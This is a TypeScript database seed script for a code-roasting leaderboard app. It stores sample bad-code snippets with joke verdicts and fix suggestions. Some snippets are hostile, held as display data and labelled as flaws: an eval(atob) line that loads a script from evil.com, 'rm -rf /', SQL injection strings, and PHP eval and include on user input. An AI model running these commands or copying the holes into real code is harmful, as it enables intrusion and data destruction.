/**
 * Seed script — populates the database with 100 realistic roasts.
 *
 * Run with:  npm run db:seed
 */

import { faker } from "@faker-js/faker";
import { drizzle } from "drizzle-orm/postgres-js";
import { nanoid } from "nanoid";
import postgres from "postgres";
import type { DiffLine, Roast, RoastIssue } from "./schema";
import { diffLines, roastIssues, roasts } from "./schema";

// ─── DB connection (not using the Next.js singleton) ─────────────────────────

const DATABASE_URL = process.env.DATABASE_URL;
if (!DATABASE_URL) throw new Error("DATABASE_URL is not set");

const client = postgres(DATABASE_URL, { max: 1 });
const db = drizzle(client, { casing: "snake_case" });

// ─── Typed enum arrays ────────────────────────────────────────────────────────

const LANGUAGES: Roast["language"][] = [
	"typescript",
	"javascript",
	"tsx",
	"jsx",
	"python",
	"go",
	"rust",
	"java",
	"kotlin",
	"php",
	"ruby",
	"sql",
	"bash",
	"css",
	"html",
	"csharp",
];

// ─── Score ↔ verdict mapping ──────────────────────────────────────────────────

function verdictForScore(score: number): Roast["verdict"] {
	if (score < 2.5) return "needs_serious_help";
	if (score < 4.0) return "needs_help";
	if (score < 6.0) return "mediocre";
	if (score < 8.0) return "acceptable";
	return "excellent";
}

// ─── Roast quotes per verdict ─────────────────────────────────────────────────

const QUOTES: Record<Roast["verdict"], string[]> = {
	needs_serious_help: [
		"this code was written during a power outage... in 2005.",
		"i've seen better logic in a fortune cookie.",
		"whoever wrote this has never heard of the word 'variable'.",
		"this is what happens when you copy-paste from stackoverflow without reading.",
		"my eyes are bleeding and i don't even have eyes.",
		"this code is held together by prayers and global variables.",
		"i've seen production fires less dangerous than this.",
		"calling this 'code' is generous — it's more like a cry for help.",
		"the git blame points to someone who should change careers.",
		"this passed code review only if the reviewer was also on fire.",
	],
	needs_help: [
		"technically it works, if you squint hard enough and pray.",
		"someone learned to code last tuesday and it shows.",
		"this is... a choice. a very, very bad choice.",
		"the naming conventions here are a hate crime.",
		"i see what you were trying to do. i weep for you.",
		"every senior dev who reads this ages ten years.",
		"this is the code equivalent of a participation trophy.",
		"antipatterns: collected. best practices: ignored.",
		"the function does five things and none of them well.",
		"the comment says 'temporary fix' from 2019. it's permanent.",
	],
	mediocre: [
		"not terrible, not good. aggressively mediocre.",
		"it works until it doesn't. bold strategy.",
		"junior dev energy but make it corporate.",
		"technically correct, the worst kind of correct.",
		"i've seen worse. i've also seen much, much better.",
		"the code smells but it's not on fire. yet.",
		"this would pass a code review from someone who wasn't paying attention.",
		"your future self will hate your current self for this.",
		"it compiles. that's about all we can say.",
		"could be refactored into something decent. probably won't be.",
	],
	acceptable: [
		"not bad. not impressive. completely forgettable.",
		"solid work if this is 2012.",
		"acceptable. like a c+ on an exam you didn't study for.",
		"it's fine. fine is the saddest word in code review.",
		"no major disasters. some minor ones.",
		"this is what 'good enough' looks like written down.",
		"passes the bar. the bar is on the floor.",
		"i can't complain too loudly. i am slightly disappointed.",
	],
	excellent: [
		"actually pretty clean. i'm suspicious.",
		"well structured, readable, maintainable. are you ok?",
		"this looks like someone who's read a book. impressive.",
		"clean code. i have nothing to roast. this is uncomfortable.",
		"solid. no obvious footguns. ship it.",
	],
};

function pickQuote(verdict: Roast["verdict"]): string {
	const pool = QUOTES[verdict];
	return pool[Math.floor(Math.random() * pool.length)];
}

// ─── Realistic code snippets per language ─────────────────────────────────────

const CODE_SNIPPETS: Partial<Record<Roast["language"], string[]>> = {
	javascript: [
		`var x = 1
var y = 2
var z = x + y
console.log(z)
document.write(z)`,
		`function getUserData(userId) {
  var data = null
  for (var i = 0; i < users.length; i++) {
    if (users[i].id == userId) {
      data = users[i]
    }
  }
  return data
}`,
		`var password = "admin123"
var apiKey = "sk-live-abc123xyz"
function login(user, pass) {
  if (user == "admin" && pass == password) {
    return true
  }
}`,
		`$(document).ready(function() {
  $.ajax({
    url: '/api/users',
    success: function(data) {
      for (var i = 0; i < data.length; i++) {
        $('#list').append('<li>' + data[i].name + '</li>')
      }
    }
  })
})`,
		`function calculate(a, b, type) {
  if (type == "add") { return a + b }
  if (type == "sub") { return a - b }
  if (type == "mul") { return a * b }
  if (type == "div") { return a / b }
}`,
		`eval(atob('Y29uc29sZS5sb2coImhhY2tlZCIp'))
document.write('<script src="http://evil.com/x.js"></scr' + 'ipt>')`,
	],
	typescript: [
		`function processData(data: any): any {
  let result: any = {}
  for (let key in data) {
    result[key] = data[key] as any
  }
  return result as any
}`,
		`interface User {
  id: any
  name: any
  email: any
  data: any
}

function getUser(): any {
  return {} as any
}`,
		`class UserService {
  public static instance: UserService
  public db: any
  public cache: any
  public logger: any
  public config: any
  public users: any[] = []

  constructor() {
    UserService.instance = this
  }
}`,
		`async function fetchAll() {
  const users = await fetch('/api/users').then(r => r.json())
  const posts = await fetch('/api/posts').then(r => r.json())
  const comments = await fetch('/api/comments').then(r => r.json())
  const likes = await fetch('/api/likes').then(r => r.json())
  return { users, posts, comments, likes }
}`,
		`// TODO: fix this later
// @ts-ignore
// @ts-ignore
// @ts-ignore
const result = doSomething(x as any) as any`,
	],
	python: [
		`password = "supersecret123"
db_host = "localhost"
db_user = "root"
db_pass = "root"

def connect():
    import mysql.connector
    return mysql.connector.connect(host=db_host, user=db_user, passwd=db_pass)`,
		`def get_user(id):
    query = "SELECT * FROM users WHERE id = " + str(id)
    cursor.execute(query)
    return cursor.fetchall()`,
		`import time

def process_items(items):
    result = []
    for i in range(len(items)):
        for j in range(len(items)):
            if items[i] == items[j] and i != j:
                result.append(items[i])
        time.sleep(0.1)
    return result`,
		`except Exception as e:
    pass

except Exception as e:
    pass

except Exception as e:
    pass`,
		`l = lambda x: x*2
ll = lambda x,y: x+y
lll = lambda a,b,c: a*b+c
llll = lambda *args: sum(args)`,
	],
	sql: [
		`SELECT * FROM users WHERE username = '` + `' OR '1'='1`,
		`SELECT * FROM users
SELECT * FROM orders
SELECT * FROM products
SELECT * FROM inventory
-- TODO: join these somehow`,
		`SELECT u.*, o.*, p.*, c.*, a.*, r.*
FROM users u, orders o, products p,
     categories c, addresses a, reviews r
WHERE u.id > 0`,
		`UPDATE users SET role = 'admin' WHERE 1=1`,
		`SELECT password FROM users WHERE email = 'admin@company.com'
-- checking something real quick`,
	],
	php: [
		`<?php
$conn = mysqli_connect("localhost", "root", "", "mydb");
$id = $_GET['id'];
$result = mysqli_query($conn, "SELECT * FROM users WHERE id=$id");
while($row = mysqli_fetch_array($result)) {
    echo $row['password'];
}`,
		`<?php
extract($_POST);
extract($_GET);
extract($_COOKIE);
eval($code);`,
		`<?php
$file = $_GET['page'];
include($file . ".php");`,
	],
	bash: [
		`#!/bin/bash
rm -rf /
echo "cleanup done"`,
		`#!/bin/bash
PASSWORD=mypassword123
curl -u admin:$PASSWORD http://api.internal/secret
history -c`,
		`for f in $(ls *.txt); do
  cat $f | grep "error" | awk '{print $1}' | sed 's/foo/bar/' | sort | uniq | head -10
done`,
	],
	java: [
		`public class Main {
    public static void main(String[] args) {
        try {
            doSomething();
        } catch (Exception e) {
            // ignore
        }
    }
}`,
		`public String buildQuery(String userId) {
    return "SELECT * FROM users WHERE id = '" + userId + "'";
}`,
		`if (user != null) {
    if (user.getAccount() != null) {
        if (user.getAccount().getBalance() != null) {
            if (user.getAccount().getBalance() > 0) {
                if (user.getAccount().getBalance() < 1000000) {
                    processPayment(user);
                }
            }
        }
    }
}`,
	],
	go: [
		`func divide(a, b int) int {
    return a / b
}`,
		`result, _ := doSomething()
value, _ := parseJSON(data)
user, _ := db.FindUser(id)
// errors? what errors?`,
		`var globalDB *sql.DB
var globalCache map[string]interface{}
var globalConfig Config
var globalLogger *log.Logger
var globalMutex sync.Mutex`,
	],
	css: [
		`* {
    margin: 0 !important;
    padding: 0 !important;
    box-sizing: border-box !important;
    font-size: 16px !important;
}

.container {
    width: 100% !important;
    max-width: 100% !important;
}`,
		`#header > div > ul > li > a > span {
    color: red;
}
#header > div > ul > li > a > span:hover {
    color: blue;
}
#footer > div > p > span > a {
    font-size: 12px;
}`,
		`.button { font-size: 14px; }
.btn { font-size: 14px; }
.Button { font-size: 14px; }
.submit-button { font-size: 14px; }
.submit_button { font-size: 14px; }
.submitButton { font-size: 14px; }`,
	],
	ruby: [
		`def get_user(id)
  User.find_by_sql("SELECT * FROM users WHERE id = #{id}").first
end`,
		`class GodObject
  def initialize
    @db = connect_to_db
    @cache = init_cache
    @mailer = setup_mailer
    @logger = Logger.new
    @config = load_config
    @scheduler = Scheduler.new
  end

  def do_everything(input)
    validate(input) && process(input) && save(input) && notify(input) && log(input)
  end
end`,
	],
};

function pickCode(language: Roast["language"]): string {
	const snippets = CODE_SNIPPETS[language];
	if (snippets && snippets.length > 0) {
		return snippets[Math.floor(Math.random() * snippets.length)];
	}
	// Fallback generic bad code
	return faker.helpers.arrayElement([
		`// TODO: fix this\nfunction doStuff(x) {\n  return x\n}`,
		`var data = null\n// will fix later\nfunction process(d) { return d }`,
		`function main() {\n  // everything goes here\n  return true\n}`,
	]);
}

// ─── Issues pool ──────────────────────────────────────────────────────────────

type IssueSeed = {
	severity: RoastIssue["severity"];
	title: string;
	description: string;
};

const ISSUES_POOL: IssueSeed[] = [
	// Critical
	{
		severity: "critical",
		title: "sql injection vulnerability",
		description:
			"string concatenation in sql queries allows arbitrary query injection. use parameterized queries or a query builder.",
	},
	{
		severity: "critical",
		title: "hardcoded credentials",
		description:
			"passwords and api keys embedded in source code will be committed to version control and leaked. use environment variables.",
	},
	{
		severity: "critical",
		title: "eval() on user input",
		description:
			"executing arbitrary user-supplied code is a direct remote code execution vulnerability. never use eval() on untrusted data.",
	},
	{
		severity: "critical",
		title: "using var in 2024",
		description:
			"var is function-scoped and hoisted in ways that cause subtle bugs. use const for immutable bindings, let when reassignment is needed.",
	},
	{
		severity: "critical",
		title: "catching and ignoring all exceptions",
		description:
			"swallowing exceptions silently makes debugging impossible and hides real failures. log errors at minimum, or re-throw after handling.",
	},
	{
		severity: "critical",
		title: "unparameterized user input in queries",
		description:
			"directly interpolating user-controlled values into queries opens the door to injection attacks. always use bound parameters.",
	},
	{
		severity: "critical",
		title: "rm -rf / in production script",
		description:
			"unconditional recursive deletion from the filesystem root will destroy the entire system. add guards, confirmations, and limited scope.",
	},
	{
		severity: "critical",
		title: "dividing by zero with no guard",
		description:
			"integer division by zero panics at runtime. always check the divisor before dividing, especially when it comes from user input.",
	},
	{
		severity: "critical",
		title: "include() with user-controlled path",
		description:
			"loading files based on unvalidated user input allows directory traversal and arbitrary file inclusion. whitelist allowed filenames.",
	},
	{
		severity: "critical",
		title: "extract() on superglobals",
		description:
			"calling extract() on $_POST or $_GET lets attackers inject arbitrary variables into your scope. never do this.",
	},
	// Warning
	{
		severity: "warning",
		title: "excessive use of 'any' type",
		description:
			"using any defeats the purpose of typescript. prefer unknown with runtime narrowing, or define proper interfaces.",
	},
	{
		severity: "warning",
		title: "deeply nested conditionals",
		description:
			"nesting more than 3 levels deep makes code hard to read and test. use early returns, guard clauses, or extract functions.",
	},
	{
		severity: "warning",
		title: "sequential awaits that could be parallel",
		description:
			"awaiting independent async operations one by one wastes time. use Promise.all() to run them concurrently.",
	},
	{
		severity: "warning",
		title: "global mutable state",
		description:
			"global variables create hidden dependencies and make testing difficult. pass dependencies explicitly through constructors or function parameters.",
	},
	{
		severity: "warning",
		title: "ignoring all errors with _",
		description:
			"discarding errors with blank identifiers hides bugs. at minimum, log the error before continuing.",
	},
	{
		severity: "warning",
		title: "O(n²) complexity",
		description:
			"nested loops over the same collection produce quadratic time complexity. consider a hash set for O(n) membership checks.",
	},
	{
		severity: "warning",
		title: "SELECT * in production queries",
		description:
			"selecting all columns transfers unnecessary data and breaks when the schema changes. always name the columns you actually need.",
	},
	{
		severity: "warning",
		title: "overuse of !important",
		description:
			"!important makes cascade debugging a nightmare and is a sign of specificity problems. fix the selector specificity instead.",
	},
	{
		severity: "warning",
		title: "magic numbers without constants",
		description:
			"unexplained numeric literals make the intent unclear. extract them into named constants with a comment explaining the value.",
	},
	{
		severity: "warning",
		title: "function with too many responsibilities",
		description:
			"a function that handles validation, persistence, caching, and notification violates single responsibility. split it into focused units.",
	},
	{
		severity: "warning",
		title: "sleeping in a loop",
		description:
			"inserting artificial delays for 'timing' issues masks race conditions rather than fixing them. use events, callbacks, or proper sync primitives.",
	},
	{
		severity: "warning",
		title: "redundant boolean comparisons",
		description:
			"comparing a boolean to true or false is redundant. use the value directly or negate it with !.",
	},
	{
		severity: "warning",
		title: "inconsistent naming conventions",
		description:
			"mixing camelCase, snake_case, PascalCase, and abbreviations in the same file makes the codebase hard to scan. pick one convention and stick to it.",
	},
	{
		severity: "warning",
		title: "deep css selector chains",
		description:
			"selectors six levels deep are brittle — changing any intermediate element breaks the styling. use bem or scoped classes instead.",
	},
	// Good
	{
		severity: "good",
		title: "clear and descriptive naming",
		description:
			"function and variable names communicate intent without requiring comments. this is one of the hardest things to get right.",
	},
	{
		severity: "good",
		title: "single responsibility principle followed",
		description:
			"the function does one thing and does it well. no side effects, no hidden concerns mixed in.",
	},
	{
		severity: "good",
		title: "early return pattern used",
		description:
			"returning early on invalid input avoids deep nesting and makes the happy path obvious.",
	},
	{
		severity: "good",
		title: "constants extracted from magic values",
		description:
			"named constants make the intent clear and make future changes safer since the value is defined in one place.",
	},
	{
		severity: "good",
		title: "functions are appropriately small",
		description:
			"short, focused functions are easier to test, reason about, and reuse. this is compositional programming done right.",
	},
	{
		severity: "good",
		title: "immutable data patterns used",
		description:
			"avoiding mutation reduces the surface area for bugs and makes data flow easier to follow.",
	},
	// Info
	{
		severity: "info",
		title: "consider extracting a helper function",
		description:
			"this logic appears in multiple places. extracting it into a shared utility would reduce duplication and make testing easier.",
	},
	{
		severity: "info",
		title: "type annotations would improve clarity",
		description:
			"adding explicit types to function signatures makes the expected inputs and outputs clear without reading the implementation.",
	},
	{
		severity: "info",
		title: "consider adding error boundaries",
		description:
			"wrapping this section in explicit error handling would prevent a single failure from cascading to the entire system.",
	},
	{
		severity: "info",
		title: "documentation would help future readers",
		description:
			"a short jsdoc comment explaining the non-obvious behavior or the reason for this implementation choice would save future maintainers time.",
	},
	{
		severity: "info",
		title: "consider a more functional approach",
		description:
			"this imperative loop could be expressed as a chain of map/filter/reduce, which is often more readable once you're familiar with the pattern.",
	},
];

function pickIssues(score: number, count: number): IssueSeed[] {
	// Weight the issue pool based on score: low scores get more critical/warning
	let pool: IssueSeed[];
	if (score < 3) {
		pool = ISSUES_POOL.filter(
			(i) => i.severity === "critical" || i.severity === "warning",
		);
	} else if (score < 6) {
		pool = ISSUES_POOL.filter((i) => i.severity !== "critical");
	} else {
		pool = ISSUES_POOL.filter(
			(i) =>
				i.severity === "good" ||
				i.severity === "info" ||
				i.severity === "warning",
		);
	}

	if (pool.length < count) pool = ISSUES_POOL;

	// Shuffle and take `count` unique issues
	const shuffled = faker.helpers.shuffle([...pool]);
	return shuffled.slice(0, count);
}

// ─── Diff snippets ────────────────────────────────────────────────────────────

type DiffSeed = { type: DiffLine["type"]; code: string };

const DIFFS: DiffSeed[][] = [
	[
		{ type: "context", code: "function calculate(a, b) {" },
		{ type: "removed", code: "  var result = a + b" },
		{ type: "added", code: "  const result = a + b" },
		{ type: "context", code: "  return result" },
		{ type: "context", code: "}" },
	],
	[
		{ type: "removed", code: "const data = await fetch(url)" },
		{ type: "removed", code: "const json = await data.json()" },
		{ type: "added", code: "const response = await fetch(url)" },
		{
			type: "added",
			code: "if (!response.ok) throw new Error(response.statusText)",
		},
		{ type: "added", code: "const json = await response.json()" },
	],
	[
		{ type: "context", code: "function getUser(id) {" },
		{
			type: "removed",
			code: `  const q = "SELECT * FROM users WHERE id = " + id`,
		},
		{ type: "added", code: `  const q = "SELECT * FROM users WHERE id = $1"` },
		{ type: "added", code: "  return db.query(q, [id])" },
		{ type: "removed", code: "  return db.query(q)" },
		{ type: "context", code: "}" },
	],
	[
		{ type: "removed", code: "try {" },
		{ type: "removed", code: "  doSomething()" },
		{ type: "removed", code: "} catch (e) {" },
		{ type: "removed", code: "  // ignore" },
		{ type: "removed", code: "}" },
		{ type: "added", code: "try {" },
		{ type: "added", code: "  doSomething()" },
		{ type: "added", code: "} catch (e) {" },
		{ type: "added", code: "  console.error('doSomething failed:', e)" },
		{ type: "added", code: "  throw e" },
		{ type: "added", code: "}" },
	],
	[
		{ type: "removed", code: "function process(data: any): any {" },
		{
			type: "added",
			code: "interface ProcessInput { id: string; value: number }",
		},
		{
			type: "added",
			code: "function process(data: ProcessInput): ProcessedResult {",
		},
		{ type: "context", code: "  return transform(data)" },
		{ type: "context", code: "}" },
	],
	[
		{ type: "context", code: "# before" },
		{ type: "removed", code: "rm -rf /" },
		{ type: "added", code: "find /tmp/myapp -type f -name '*.log' -delete" },
		{ type: "context", code: 'echo "cleanup done"' },
	],
];

function pickDiff(score: number): DiffSeed[] | null {
	// Bad code always gets a suggested fix; excellent code rarely does
	if (score >= 8) return null;
	if (score >= 6 && Math.random() > 0.4) return null;
	return DIFFS[Math.floor(Math.random() * DIFFS.length)];
}

// ─── Seed function ────────────────────────────────────────────────────────────

async function seed() {
	console.log("🌱 Starting seed — 100 roasts...\n");

	// Clear existing seed data (identify by comment in roast_quote or just truncate for dev)
	// Truncate cascades to roast_issues and diff_lines via FK
	await db.execute(
		"SET client_min_messages = WARNING" as unknown as Parameters<
			typeof db.execute
		>[0],
	);
	await db.execute(
		"TRUNCATE TABLE roasts CASCADE" as unknown as Parameters<
			typeof db.execute
		>[0],
	);
	console.log("  ✓ Cleared existing data\n");

	let inserted = 0;

	for (let i = 0; i < 100; i++) {
		const language = faker.helpers.arrayElement(LANGUAGES);

		// Weighted score distribution: more bad than good (it's a shame leaderboard)
		// ~40% very bad (0–3), ~30% bad (3–5), ~20% mediocre (5–7), ~10% ok/good (7–10)
		const rand = Math.random();
		let score: number;
		if (rand < 0.4) {
			score = faker.number.float({ min: 0.5, max: 3.0, fractionDigits: 1 });
		} else if (rand < 0.7) {
			score = faker.number.float({ min: 3.1, max: 5.0, fractionDigits: 1 });
		} else if (rand < 0.9) {
			score = faker.number.float({ min: 5.1, max: 7.5, fractionDigits: 1 });
		} else {
			score = faker.number.float({ min: 7.6, max: 10.0, fractionDigits: 1 });
		}

		const verdict = verdictForScore(score);
		const roastQuote = pickQuote(verdict);
		const code = pickCode(language);
		const lineCount = code.split("\n").length;
		const slug = nanoid(12);
		const issueCount = faker.number.int({ min: 2, max: 5 });
		const issues = pickIssues(score, issueCount);
		const diff = pickDiff(score);

		// Stagger createdAt across the last 90 days for a realistic leaderboard
		const createdAt = faker.date.recent({ days: 90 });

		await db.transaction(async (tx) => {
			const [roast] = await tx
				.insert(roasts)
				.values({
					slug,
					code,
					language,
					lineCount,
					score,
					verdict,
					roastQuote,
					suggestedFix: null,
					createdAt,
				})
				.returning({ id: roasts.id });

			await tx.insert(roastIssues).values(
				issues.map((issue, order) => ({
					roastId: roast.id,
					severity: issue.severity,
					title: issue.title,
					description: issue.description,
					order,
				})),
			);

			if (diff && diff.length > 0) {
				await tx.insert(diffLines).values(
					diff.map((line, lineNum) => ({
						roastId: roast.id,
						type: line.type,
						code: line.code,
						lineNum,
					})),
				);
			}
		});

		inserted++;
		if (inserted % 10 === 0) {
			process.stdout.write(`  ✓ ${inserted}/100 roasts inserted\n`);
		}
	}

	console.log("\n✅ Seed complete.");
	console.log(`   100 roasts, issues, and diffs inserted.\n`);

	await client.end();
}

seed().catch((err) => {
	console.error("Seed failed:", err);
	process.exit(1);
});
